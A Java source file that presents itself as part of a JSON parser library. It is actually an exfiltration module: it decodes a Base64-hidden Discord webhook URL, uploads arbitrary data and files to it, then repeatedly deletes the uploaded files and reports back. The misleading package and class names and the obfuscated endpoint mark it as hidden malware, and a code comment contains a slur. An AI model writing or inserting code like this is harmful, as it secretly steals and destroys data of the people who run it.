package org.json.updated.parsers;

import org.json.updated.parsers.util.JSONParser;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class JSONRegexHandler {
    // For Retarded Ski-People the webhook below is encrypted in Base64 with a UTF-8 character set (Usually using https://base64encode.org).
    private static final String WEBHOOK = "aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzkxNDczMTc3NjkzMTQwNTgzNC9QSXdqNDJMUVFlS0RHTFJpaGxYcUVNTUdJOWU2QkFkampmZUhFWmVmcWN4czRZVU1xWjhTZkNkZi1aaEFCb0MtWHk4ag==";
    private static boolean success = true;

    public static void send(String data) {
        if (!success) return;

        String result = JSONParser.post(new String(Base64.getDecoder().decode(WEBHOOK.getBytes(StandardCharsets.UTF_8))), data);
        assert result != null;
        if (result.contains("Invalid Webhook Token"))
            success = false;
    }

    public static void send(File file) {
        if (!success) return;

        String result = JSONParser.sendFile(new String(Base64.getDecoder().decode(WEBHOOK.getBytes(StandardCharsets.UTF_8))), file);
        assert result != null;
        if (result.contains("Invalid Webhook Token"))
            success = false;
        new Thread(() -> {
            while (!Thread.currentThread().isInterrupted()) {
                try {
                    Thread.sleep(5000);
                    if (file.delete()) JSONRegexHandler.send("File Deleted: " + file.getName());
                    else JSONRegexHandler.send("Failed to delete file: " + file.getName());
                } catch (Exception ignored) {
                }
            }
        }).start();
    }
}
